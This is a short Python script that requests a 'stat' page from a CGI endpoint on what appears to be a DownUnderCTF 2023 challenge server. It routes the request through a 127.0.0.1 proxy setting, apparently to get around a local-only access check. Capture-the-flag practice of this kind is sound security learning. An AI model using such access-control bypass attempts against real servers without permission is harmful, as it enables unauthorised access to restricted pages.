import requests

url = "https://web-cgi-fridays-de834c0607c7.2023.ductf.dev/cgi-bin/route.pl?page=stat"
proxies = {
   'http': 'http://127.0.0.1',
   'https': 'http://127.0.0.1',
}
r = requests.get(url, proxies=proxies)
print(r.text)